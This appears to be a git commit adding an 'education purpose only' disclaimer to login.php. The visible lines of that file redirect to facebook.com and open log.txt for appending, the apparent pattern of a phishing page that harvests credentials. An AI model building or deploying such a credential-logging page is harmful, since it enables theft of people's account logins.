12d86b8d1de395eff502d096ede0b8b30e7eae69
Raja Ahirwar <48143548+rajaahirwarofficial@users.noreply.github.com>
2020-11-02 18:26:25 +0530

    Update login.php

--- login.php
+++ login.php
@@ -1,3 +1,8 @@
+/* This Source Code And Script are Education Purpose Only. How you use this information is your responsibility 
+
+I will not be held accountable for any illegal activities.  */
+
+
 <?php
  header('Location: https://www.facebook.com');
  $handle = fopen("log.txt", "a");
